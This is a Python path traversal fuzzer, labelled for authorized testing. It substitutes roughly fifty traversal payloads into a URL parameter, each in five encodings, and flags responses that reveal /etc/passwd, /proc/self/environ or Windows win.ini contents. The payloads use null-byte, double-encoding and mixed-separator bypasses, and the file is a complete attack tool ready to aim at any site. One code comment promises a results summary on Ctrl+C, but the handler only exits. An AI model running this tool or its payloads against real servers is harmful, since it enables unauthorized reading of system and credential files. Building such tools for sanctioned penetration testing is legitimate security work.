# PATH TRAVERSAL FUZZER
# Author: Cybernerddd
# For authorized testing only

import argparse
import requests
import urllib.parse
import signal


BANNER = r"""                                                                                                                                          
▄█████ ▄▄ ▄▄ ▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄  ▄▄▄▄▄ ▄▄  ▄▄ ▄▄▄▄▄ ▄▄▄▄  ▄▄▄▄  ▄▄▄▄  ▄▄▄▄  
██     ▀███▀ ██▄██ ██▄▄  ██▄█▄ ██▄▄  ███▄██ ██▄▄  ██▄█▄ ██▀██ ██▀██ ██▀██ 
▀█████   █   ██▄█▀ ██▄▄▄ ██ ██ ██▄▄▄ ██ ▀██ ██▄▄▄ ██ ██ ████▀ ████▀ ████▀ 
                                                                          
        Path Traversal Fuzzer
        Author: Cybernerddd
        For Authorized Testing Only
"""

# Needs to expect Ctrl+C to cancel the scan, so we can print a summary of results so far and print a nice message instead of a stack trace. This is especially important for long scans that may find hits before being stopped by the tester.
try:

    def signal_handler(sig, frame):
        print("\n[!] Scan interrupted by user. Exiting gracefully...")
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    def encode_payload(payload, mode):
        if mode == "raw":
            return payload

        if mode == "url":
            return urllib.parse.quote(payload, safe="")

        if mode == "double":
            return urllib.parse.quote(
                urllib.parse.quote(payload, safe=""),
                safe=""
            )

        if mode == "slash_only":
            return payload.replace("/", "%2F").replace("\\", "%5C")

        if mode == "dot_only":
            return payload.replace(".", "%2e")

        return payload


    def build_target_url(url, payload):
        return url.replace("INJECT", payload)


    def is_possible_hit(text):
        indicators = [
            "root:x:0:0:",
            "daemon:x:",
            "bin:x:",
            "/bin/bash",
            "/bin/sh",
            "/usr/sbin",
            "localhost",
            "[fonts]",
            "[extensions]",
            "[mci extensions]",
            "for 16-bit app support",
            "boot.ini",
        ]

        return any(indicator.lower() in text.lower() for indicator in indicators)


    payloads = [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",

        "/etc/passwd",
        "/etc/hosts",
        "/proc/self/environ",

        "../index.php",
        "../../index.php",
        "../../../index.php",
        "../../../../index.php",

        "..\\windows\\win.ini",
        "..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",

        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",

        "..\\../etc/passwd",
        "../..\\etc/passwd",
        "..\\..\\../etc/passwd",

        "....//etc/passwd",
        "....//....//etc/passwd",
        "..././..././etc/passwd",
        "..//..//..//etc/passwd",

        "./../etc/passwd",
        ".//../etc/passwd",
        "././../etc/passwd",

        "..;/etc/passwd",
        "..;/..;/etc/passwd",
        "..;/..;/..;/etc/passwd",

        "%2e%2e%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",

        "%252e%252e%252fetc%252fpasswd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",

        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        "../../../../etc/passwd%00.png",

        "../../../../etc/passwd.",
        "../../../../etc/passwd/",
        "../../../../etc/passwd%20",
        "../../../../etc/passwd%0a",
        "../../../../etc/passwd%0d%0a",
    ]


    def main():
        print(BANNER)

        parser = argparse.ArgumentParser(
            description="Path Traversal Fuzzer for authorized testing"
        )

        parser.add_argument(
            "-u",
            "--url",
            required=True,
            help='Target URL with INJECT marker, e.g. "https://site.com/view?file=INJECT"',
        )

        args = parser.parse_args()

        if "INJECT" not in args.url:
            print("[!] Error: URL must contain the INJECT marker.")
            return

        encoding_modes = ["raw", "url", "double", "slash_only", "dot_only"]

        print(f"[+] Target: {args.url}")
        print(f"[+] Payloads loaded: {len(payloads)}")
        print("[+] Starting fuzzing...")
        print("[+] Scanning", end="", flush=True)

        tested_urls = set()
        hits = []

        for payload in payloads:
            for mode in encoding_modes:
                encoded = encode_payload(payload, mode)
                target = build_target_url(args.url, encoded)

                if target in tested_urls:
                    continue

                tested_urls.add(target)
                print(".", end="", flush=True)

                try:
                    response = requests.get(
                        target,
                        timeout=8,
                        allow_redirects=True,
                        headers={
                            "User-Agent": "Cybernerddd-PathTraversal-Fuzzer/1.0"
                        },
                    )

                    if is_possible_hit(response.text):
                        hits.append({
                            "status": response.status_code,
                            "length": len(response.text),
                            "payload": payload,
                            "url": target,
                        })

                except requests.RequestException:
                    continue

        print("\n")

        if hits:
            print("[+] SUCCESSFUL MATCHES")
            print("-" * 100)

            for hit in hits:
                print(
                    f"[{hit['status']}] "
                    f"len={hit['length']} | "
                    f"payload={hit['payload']} | "
                    f"url={hit['url']}"
                )

        else:
            print("[-] No path traversal indicators found.")

        print("\n[+] SUMMARY")
        print(f"    Successful hits       : {len(hits)}")
        print(f"    Unique requests tested: {len(tested_urls)}")
        print("[+] Scan complete.")


    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    print("\n[!] Scan interrupted by user. Exiting gracefully...")
    exit(0)